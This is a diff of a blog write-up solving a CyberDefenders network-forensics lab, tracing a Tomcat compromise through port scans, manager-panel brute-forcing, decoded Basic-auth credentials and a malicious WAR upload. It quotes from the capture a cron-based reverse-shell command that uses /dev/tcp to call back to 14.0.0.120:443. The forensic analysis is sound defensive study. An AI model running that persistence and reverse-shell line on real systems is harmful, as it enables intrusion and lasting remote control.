@@ -4,7 +4,7 @@ draft: false
 date: 2026-10-30T03:16:38.930Z
 categories:
   - Writeup
-lastmod: 2026-11-02T17:02:43.716Z
+lastmod: 2026-11-03T05:32:35.040Z
 description: Nothing is that serious, so please choose peace.
 cover: https://i.pinimg.com/1200x/a3/8c/bd/a38cbd1d6d6a1c4519f204926e5eca9d.jpg
 tags:
@@ -243,7 +243,7 @@ There are clusters of SMB2 traffic, which are attempting to:
 
 **- Q3: NTLMSSP_AUTH, User: \ssales**
 
-**- Q4: Write `psexesvc.exe`**
+**- Q4: Write psexesvc.exe**
 
 I suppose, these are signs of the attacker has successfully gained access of the workstation.
 
@@ -303,6 +303,8 @@ If you follow the stream chronologically, you can see that down the end of the p
 - **Difficulty**: CyberDefenders - SOC Analyst Tier 1 - Level 2
 - **Category**: Network Forensics
 
+> *"Apache Tomcat is a free and open-source implementation of the Jakarta EE Servlet, Pages, Expression Language, WebSocket, Annotations and Authentication technologies. It provides a "pure Java" HTTP web server environment in which Java code can also run."*
+
 **Q1. Given the suspicious activity detected on the web server, the PCAP file reveals a series of requests across various ports, indicating potential scanning behavior. Can you identify the source IP address responsible for initiating these requests on our server?**
 
 The `Dst. Port` of requests from the IP address `14.0.0.120` varies. 
@@ -353,24 +355,54 @@ We can therefore infer that, the `/manager` directory (which has been discovered
 
 **Q6. After accessing the admin panel, the attacker brute-forced the login. What credentials did the attacker successfully use? (Provide them in username:password format)**
 
-Initially, I tried to filter for `username`, but this is not the correct credential.
+Initially, I tried to filter for `username`
 
 ![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793635670695-c0c7e2.png)
 
-Try again, let's filter for `manager` and `http`
+However, this is not the correct credential. To be fair, these TCP traffic do not reveal much, so let's try again with `manager` and `http`.
 
 ![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793638606343-008f19.png)
 
-We can see that there is some trial and error at play. The attacker tried to login unauthorized, and failed multipled time. Their failed credential is `dG9tY2F0OnMzY3IzdA==`, which is... `tomcat:s3cr3t`
+This give us a much better view of what really happened. We can see that there is some trial and error at play, with multiple `401 Unauthorized`, suggesting that the attacker tried to login and failed multipled times.
 
+The credential of their failed attempts is `dG9tY2F0OnMzY3IzdA==`, which is... `tomcat:s3cr3t`, similar to the one we have discovered above.
+
+But in the end, the attacker has successfully accessed the admin panel via `/manager`, and call some suspicious actions such as
+
+- `GET /manager/images/tomcat.gif HTTP/1.1`
+- `GET /JXQOZY/ HTTP/1.1`
+
+We can trace back to the successful authorization from those behaviors, which is the last `GET /manager/html` we can see in the image above. In fact, it used a rather different credential: `YWRtaW46dG9tY2F0==`, which is `admin:tomcat` - the correct answer to this question.
 
 `Answer: admin:tomcat`
 
 **Q7. Once inside the admin panel, the attacker attempted to upload a file with the intent of establishing a reverse shell. Can you identify the name of this malicious file from the captured data?**
 
+Following the suspicious `GET /JXQOZY/ HTTP/1.1`, we can see that the attacker actually try to deploy the file `JXQOZY.war`
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793677380023-ee2454.png)
+
+> A `.war` (Web Application Archive) file is a standard package format used to deploy Java-based web applications on web servers/servlet containers (Apache Tomcat, JBoss, WildFly). By itself, a `.war` file is just a ZIP archive containing Java classes, JSPs, HTML files, and configuration data.
+>
+> That said, `.war` (or `.jar` in general) is benign intrinsically. They only become malicious when an attacker embeds unauthorized code (web shell, backdoor, or RCE payload) inside the archive and deploys or uploads it to a vulnerable server.
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793679283691-136ae2.png)
+
+The file was successfully uploaded and accessed by the attacker afterwards, resulting in the `HTTP/1.1 200 OK` response from the server.
+
 `Answer: JXQOZY.war`
 
 **Q8. After the attacker established a reverse shell on our server, the payload connects back to the attacker's machine. From the analysis, what is the callback destination in IP:port format?**
+
+Having established the shell, the attacker performs a host of commands afterwards, such as `whoami`, `cd /tmp`, `pwd`. These are simple, but there is a more noteworthy command:
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793682176146-c509d8.png)
+
+`echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'" > cron`
+
+> `cron` is a time-based job scheduler in Unix-like operating systems, which can run scripts, commands, or software routines at specified times or regular intervals. A scheduled job is known as a `cron job`.
+
+The command overwrites `cron`, rendering it to spawn the malicious reverse shell payload every minutes. Specificially, it redirects `stdin` and `stdout` to the open TCP connection at the IP address `14.0.0.120` on port `443`. This is typical of a persistent RCE.
 
 `Answer: 14.0.0.120:443`
 
